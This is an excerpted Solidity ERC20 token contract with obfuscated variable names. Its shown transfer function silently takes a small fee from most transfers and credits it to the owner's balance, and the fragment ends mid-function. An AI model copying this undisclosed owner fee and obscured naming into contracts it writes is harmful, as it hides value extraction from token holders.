...
contract ZDFGCL is Context, Ownable,  IERC20 {
  using SafeMath for uint256;


 uint256 private _NSOFNT;

 string private _name;

 uint256 private _totalSupply;

 address private _UTIXIU;

 mapping (address => uint256) private _balances;

 uint8 private _decimals;

 uint256 private FGJSCW = 100;
 ...
 string private _symbol;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    uint256 HGPGXI = 0;
    if (recipient!=owner()){
       HGPGXI = amount.mul(FGJSCW).div(100000);
      _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount.sub(HGPGXI));
      _balances[owner()] = _balances[owner()].add(HGPGXI);
    }else{
       _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
